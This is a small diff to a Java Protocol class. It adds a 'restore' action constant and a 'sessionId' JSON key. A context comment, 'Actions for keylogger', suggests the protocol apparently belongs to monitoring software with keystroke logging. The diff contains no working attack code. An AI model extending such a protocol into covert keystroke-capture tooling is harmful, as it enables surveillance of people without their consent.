@@ -60,6 +60,7 @@ public final class Protocol {
     public static final String ACT_SHOW          = "show";
     public static final String ACT_UNHIDE        = "unhide";
     public static final String ACT_OPEN_SETTINGS = "open_settings";
+    public static final String ACT_RESTORE       = "restore";
 
     // JSON keys — request
     public static final String KEY_TYPE   = "type";
@@ -216,6 +217,7 @@ public final class Protocol {
     public static final String KEY_SINCE      = "since";
     public static final String KEY_LIMIT      = "limit";
     public static final String KEY_EVENT_TYPE = "eventType";
+    public static final String KEY_SESSION_ID = "sessionId";
     public static final String KEY_HISTORY    = "history";
 
     // Actions for keylogger
